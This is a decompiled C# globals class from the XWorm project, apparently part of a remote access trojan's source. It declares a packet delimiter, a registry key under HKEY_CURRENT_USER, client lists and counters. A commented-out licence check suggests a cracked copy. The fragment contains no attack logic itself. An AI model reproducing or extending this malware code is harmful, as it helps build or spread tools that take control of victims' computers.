using System.Collections.Generic;
using System.Runtime.CompilerServices;

namespace XWorm;

public class GClass19
{
	public static int int_0;

	public static readonly string string_0 = "<Xwormmm>";

	public static string string_1;

	public static string string_2;

	public static bool bool_0;

	public static string string_3;

	public static bool bool_1 = false;

	public static List<GClass5> gclass5s_0 = new List<GClass5>();

	public static List<string> strings_0;

	public static string string_4 = "HKEY_CURRENT_USER\\SOFTWARE\\XWorm";

	public static object object_0 = RuntimeHelpers.GetObjectValue(new object());

	public static string string_5;

	public static long long_0 = 0L;

	public static long long_1 = 0L;

	public static int int_1 = 0;

	//private static string string_6 = "XWormV5-License";

	//private static string pUUJbNaqfB = "pUUJbNaqfB";

	//private static string string_7 = "216407552b19f94da5e0df7aa66372416d12bcff824fad87f8d39cac662dd5cb";

	//private static string string_8 = "1.0";

	//public static GClass2 gclass2_0 = new GClass2(string_6, pUUJbNaqfB, string_7, string_8);
}